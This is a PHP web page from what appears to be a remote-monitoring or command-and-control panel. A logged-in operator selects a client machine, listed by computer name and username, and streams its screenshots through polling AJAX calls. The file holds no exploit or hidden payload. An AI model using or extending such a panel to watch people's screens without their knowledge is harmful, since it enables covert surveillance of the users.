<?php
// Smooth Live View - AJAX-based real-time screenshot stream
session_start();

if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

$client_id = isset($_GET['client_id']) ? $_GET['client_id'] : '';

if(empty($client_id)) {
    die("No client specified");
}

// Get client info for display
$db_host = getenv('PGHOST');
$db_name = getenv('PGDATABASE');
$db_user = getenv('PGUSER');
$db_pass = getenv('PGPASSWORD');

try {
    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $stmt = $pdo->prepare("SELECT * FROM clients WHERE id = ?");
    $stmt->execute([$client_id]);
    $client = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if(!$client) {
        die("Client not found!");
    }
} catch(PDOException $e) {
    die("Database connection failed!");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🎥 Smooth Live View - <?= htmlspecialchars($client['computer_name']) ?></title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e27; color: #eee; padding: 20px; overflow-x: hidden; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .back-btn { background: #3282b8; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; font-size: 14px; }
        .controls { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 15px; align-items: center; flex-wrap: wrap; }
        .btn { background: #3282b8; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; transition: all 0.3s; }
        .btn:hover { opacity: 0.8; transform: scale(1.05); }
        .btn:active { transform: scale(0.95); }
        .btn-start { background: #51cf66; }
        .btn-stop { background: #ff6b6b; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .status { padding: 10px 20px; background: #0f4c75; border-radius: 5px; font-weight: bold; transition: all 0.3s; }
        .status.live { background: #51cf66; color: #000; animation: pulse 2s infinite; }
        .status.stopped { background: #ff6b6b; }
        .status.loading { background: #ffd43b; color: #000; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        .viewer { background: #16213e; padding: 20px; border-radius: 10px; text-align: center; min-height: 500px; position: relative; }
        .viewer img { max-width: 100%; height: auto; border: 2px solid #0f4c75; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); transition: opacity 0.5s; }
        .viewer img.updating { opacity: 0.7; }
        .info-bar { background: #0f4c75; padding: 15px; border-radius: 5px; margin-bottom: 15px; display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; text-align: center; }
        .info-item label { display: block; color: #aaa; font-size: 0.85em; margin-bottom: 5px; }
        .info-item value { display: block; font-size: 1.1em; font-weight: bold; color: #51cf66; }
        .no-screenshot { padding: 80px 20px; text-align: center; color: #666; font-size: 1.2em; }
        .loading-spinner { border: 4px solid #0f4c75; border-top: 4px solid #51cf66; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 40px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .fps-counter { background: rgba(0,0,0,0.7); color: #51cf66; padding: 5px 10px; border-radius: 5px; position: absolute; top: 30px; right: 30px; font-family: monospace; font-size: 0.9em; }
        .stats { display: flex; gap: 10px; flex-wrap: wrap; }
        .stat { background: #0f4c75; padding: 8px 15px; border-radius: 5px; font-size: 0.9em; }
        .notification { position: fixed; top: 20px; right: 20px; background: #51cf66; color: #000; padding: 15px 20px; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); z-index: 1000; animation: slideIn 0.3s; }
        .notification.error { background: #ff6b6b; color: #fff; }
        @keyframes slideIn { from { transform: translateX(400px); } to { transform: translateX(0); } }
        .quality-selector { display: flex; gap: 10px; align-items: center; }
        .quality-selector label { font-size: 0.9em; color: #aaa; }
        .quality-selector select { background: #0f4c75; color: #eee; border: 1px solid #3282b8; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🎥 Smooth Live View</h1>
            <small style="opacity: 0.8;"><?= htmlspecialchars($client['computer_name']) ?> (<?= htmlspecialchars($client['username']) ?>)</small>
        </div>
        <a href="view_client.php?id=<?= $client['id'] ?>" class="back-btn">← Back to Client</a>
    </div>
    
    <div class="controls">
        <button id="startBtn" class="btn btn-start" onclick="startLiveView()">▶️ Start Live View</button>
        <button id="stopBtn" class="btn btn-stop" onclick="stopLiveView()" disabled>⏹️ Stop</button>
        
        <div class="status" id="statusIndicator">⚫ STOPPED</div>
        
        <div class="quality-selector">
            <label>Update Rate:</label>
            <select id="updateRate" onchange="changeUpdateRate()">
                <option value="1000">Fast (1s)</option>
                <option value="2000" selected>Normal (2s)</option>
                <option value="3000">Slow (3s)</option>
                <option value="5000">Very Slow (5s)</option>
            </select>
        </div>
        
        <div class="stats">
            <div class="stat">FPS: <span id="fpsDisplay">0</span></div>
            <div class="stat">Frames: <span id="frameCount">0</span></div>
            <div class="stat">Bandwidth: <span id="bandwidthDisplay">0 KB/s</span></div>
        </div>
    </div>
    
    <div class="viewer" id="viewer">
        <div class="info-bar" id="infoBar" style="display: none;">
            <div class="info-item">
                <label>Last Updated</label>
                <value id="lastUpdate">Never</value>
            </div>
            <div class="info-item">
                <label>Screenshot Size</label>
                <value id="screenshotSize">0 MB</value>
            </div>
            <div class="info-item">
                <label>Status</label>
                <value id="viewerStatus">Idle</value>
            </div>
            <div class="info-item">
                <label>Next Update</label>
                <value id="nextUpdate">-</value>
            </div>
        </div>
        
        <div id="screenshotContainer">
            <div class="no-screenshot">
                <p style="font-size: 2em; margin-bottom: 20px;">📷</p>
                <p>Click "Start Live View" to begin monitoring</p>
                <p style="color: #888; margin-top: 10px; font-size: 0.9em;">
                    Screenshots will update automatically without page refresh
                </p>
            </div>
        </div>
    </div>
    
    <script>
        const CLIENT_ID = <?= $client['id'] ?>;
        let isLiveViewActive = false;
        let updateInterval = null;
        let lastScreenshotId = null;
        let frameCount = 0;
        let startTime = null;
        let lastDataSize = 0;
        let updateRate = 2000; // Default 2 seconds
        let countdownInterval = null;
        let nextUpdateTime = 0;
        
        function showNotification(message, isError = false) {
            const notif = document.createElement('div');
            notif.className = 'notification' + (isError ? ' error' : '');
            notif.textContent = message;
            document.body.appendChild(notif);
            
            setTimeout(() => {
                notif.style.animation = 'slideIn 0.3s reverse';
                setTimeout(() => notif.remove(), 300);
            }, 3000);
        }
        
        function updateStatus(text, className) {
            const indicator = document.getElementById('statusIndicator');
            indicator.textContent = text;
            indicator.className = 'status ' + className;
        }
        
        function startLiveView() {
            if(isLiveViewActive) return;
            
            isLiveViewActive = true;
            startTime = Date.now();
            frameCount = 0;
            
            document.getElementById('startBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('infoBar').style.display = 'grid';
            
            updateStatus('🔴 LIVE', 'live');
            showNotification('Live view started');
            
            // Request first screenshot
            fetch(`live_view_ajax.php?client_id=${CLIENT_ID}&action=start`)
                .then(r => r.json())
                .then(data => {
                    console.log('Screenshot requested');
                });
            
            // Start update loop
            updateInterval = setInterval(checkForNewScreenshot, updateRate);
            startCountdown();
        }
        
        function stopLiveView() {
            if(!isLiveViewActive) return;
            
            isLiveViewActive = false;
            
            if(updateInterval) {
                clearInterval(updateInterval);
                updateInterval = null;
            }
            
            if(countdownInterval) {
                clearInterval(countdownInterval);
                countdownInterval = null;
            }
            
            document.getElementById('startBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            
            updateStatus('⚫ STOPPED', 'stopped');
            document.getElementById('nextUpdate').textContent = '-';
            showNotification('Live view stopped');
            
            // Cancel pending screenshots
            fetch(`live_view_ajax.php?client_id=${CLIENT_ID}&action=stop`)
                .then(r => r.json())
                .then(data => {
                    console.log('Pending screenshots cancelled');
                });
        }
        
        function checkForNewScreenshot() {
            if(!isLiveViewActive) return;
            
            fetch(`live_view_ajax.php?client_id=${CLIENT_ID}&action=get`)
                .then(r => r.json())
                .then(data => {
                    if(data.success && data.has_screenshot) {
                        if(data.screenshot_id !== lastScreenshotId) {
                            // New screenshot!
                            displayScreenshot(data);
                            lastScreenshotId = data.screenshot_id;
                            frameCount++;
                            lastDataSize = data.size;
                        }
                    }
                    
                    // Always request new screenshot if none pending
                    if(!data.pending && isLiveViewActive) {
                        fetch(`live_view_ajax.php?client_id=${CLIENT_ID}&action=start`);
                    }
                    
                    if(data.pending) {
                        document.getElementById('viewerStatus').textContent = 'Updating...';
                        document.getElementById('viewerStatus').style.color = '#ffd43b';
                    } else {
                        document.getElementById('viewerStatus').textContent = 'Live';
                        document.getElementById('viewerStatus').style.color = '#51cf66';
                    }
                    
                    updateStats();
                })
                .catch(err => {
                    console.error('Error:', err);
                    updateStatus('⚠️ ERROR', 'error');
                });
            
            // Reset countdown
            nextUpdateTime = updateRate;
        }
        
        function displayScreenshot(data) {
            const container = document.getElementById('screenshotContainer');
            const img = document.createElement('img');
            img.src = 'data:image/bmp;base64,' + data.data;
            img.alt = 'Live Screenshot';
            
            // Smooth transition
            img.style.opacity = '0';
            container.innerHTML = '';
            container.appendChild(img);
            
            setTimeout(() => {
                img.style.opacity = '1';
            }, 50);
            
            // Update info
            document.getElementById('lastUpdate').textContent = new Date(data.timestamp).toLocaleTimeString();
            document.getElementById('screenshotSize').textContent = (data.size / 1024 / 1024).toFixed(2) + ' MB';
        }
        
        function updateStats() {
            if(!startTime) return;
            
            const elapsed = (Date.now() - startTime) / 1000;
            const fps = (frameCount / elapsed).toFixed(2);
            const bandwidth = (lastDataSize / 1024 / (updateRate / 1000)).toFixed(1);
            
            document.getElementById('fpsDisplay').textContent = fps;
            document.getElementById('frameCount').textContent = frameCount;
            document.getElementById('bandwidthDisplay').textContent = bandwidth + ' KB/s';
        }
        
        function changeUpdateRate() {
            const newRate = parseInt(document.getElementById('updateRate').value);
            updateRate = newRate;
            
            if(isLiveViewActive) {
                // Restart with new rate
                clearInterval(updateInterval);
                updateInterval = setInterval(checkForNewScreenshot, updateRate);
                
                clearInterval(countdownInterval);
                startCountdown();
                
                showNotification('Update rate changed to ' + (newRate / 1000) + 's');
            }
        }
        
        function startCountdown() {
            nextUpdateTime = updateRate;
            
            countdownInterval = setInterval(() => {
                if(nextUpdateTime > 0) {
                    nextUpdateTime -= 100;
                    document.getElementById('nextUpdate').textContent = (nextUpdateTime / 1000).toFixed(1) + 's';
                }
            }, 100);
        }
    </script>
</body>
</html>
